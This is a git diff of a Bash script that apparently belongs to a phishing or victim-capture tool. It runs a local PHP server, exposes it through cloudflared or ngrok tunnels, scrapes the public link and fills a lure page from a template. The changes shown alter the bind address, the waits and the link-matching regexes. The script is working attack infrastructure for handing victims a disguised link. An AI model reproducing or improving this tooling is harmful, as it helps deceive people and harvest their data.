@@ -270,25 +270,25 @@ else
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 0.0.0.0:3333 > php_server.log 2>&1 & 
-sleep 2
+php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
+sleep 5
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1
 
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel --url http://localhost:3333 > .cloudflared_output.log 2>&1 &
+    ./cloudflared.exe tunnel --url http://127.0.0.1:3333 > .cloudflared_output.log 2>&1 &
 else
-    ./cloudflared tunnel --url http://localhost:3333 > .cloudflared_output.log 2>&1 &
+    ./cloudflared tunnel --url http://127.0.0.1:3333 > .cloudflared_output.log 2>&1 &
 fi
 
 max_attempts=15
 attempt=0
 while [[ $attempt -lt $max_attempts ]]; do
-    link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" 2>/dev/null | head -n1)
+    link=$(grep -oE 'https://[-0-9a-zA-Z.]+trycloudflare.com' ".cloudflared_output.log" 2>/dev/null | head -n1)
     if [[ ! -z "$link" ]]; then
         break
     fi
-    sleep 2
+    sleep 3
     attempt=$((attempt + 1))
 done
 
@@ -309,7 +309,7 @@ checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" | head -n1)
+link=$(grep -oE 'https://[-0-9a-zA-Z.]+trycloudflare.com' ".cloudflared_output.log" | head -n1)
 # Usamos redirección relativa para evitar errores 502/503 del túnel
 sed 's+forwarding_link+index2.html+g' template.php > index.php 2>/dev/null
 if [[ $option_tem -eq 1 ]]; then
@@ -424,10 +424,10 @@ if [[ "$windows_mode" == true ]]; then
         ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
-    sleep 2
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    sleep 5
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok.exe http localhost:3333 > /dev/null 2>&1 &
+    ./ngrok.exe http 127.0.0.1:3333 > /dev/null 2>&1 &
 else
     if [[ -e ~/.ngrok2/ngrok.yml ]]; then
         printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
@@ -443,15 +443,15 @@ else
         ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
-    sleep 2
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    sleep 5
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok http localhost:3333 > /dev/null 2>&1 &
+    ./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
 fi
 
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n1)
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -oE 'https://[-0-9a-zA-Z.]+ngrok-free.app' | head -n1)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
